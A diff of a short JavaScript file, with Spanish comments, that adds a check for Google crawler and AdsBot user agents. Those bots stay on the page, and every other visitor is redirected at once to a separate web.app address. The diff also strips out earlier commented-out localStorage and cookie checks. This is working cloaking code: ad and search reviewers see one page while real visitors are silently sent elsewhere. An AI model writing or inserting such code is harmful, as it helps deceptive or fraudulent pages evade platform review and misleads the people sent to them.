@@ -1,3 +1,9 @@
+// Función para detectar si el usuario es un bot de Google
+function esBot() {
+    const userAgent = navigator.userAgent.toLowerCase();
+    return userAgent.includes('googlebot') || userAgent.includes('adsbot');
+}
+
 // Función principal para manejar la redirección
 function manejarRedireccion() {
     if (esBot()) {
@@ -5,16 +11,8 @@ function manejarRedireccion() {
         return;
     }
 
-    // Eliminar la verificación de localStorage y cookies
-    // const clave = 'nombreUsuario';
-    // const usuarioAlmacenado = localStorage.getItem(clave);
-    // const hayCookies = document.cookie.length > 0;
-
     // Redirigir directamente sin verificar datos
     window.location.href = 'https://plebe2.web.app/';
-    
-    // Eliminar el mensaje de consola
-    // console.log("No hay datos en localStorage ni cookies. Manteniéndose en plebe1.web.app/");
 }
 
 // Ejecutar la función al cargar el script
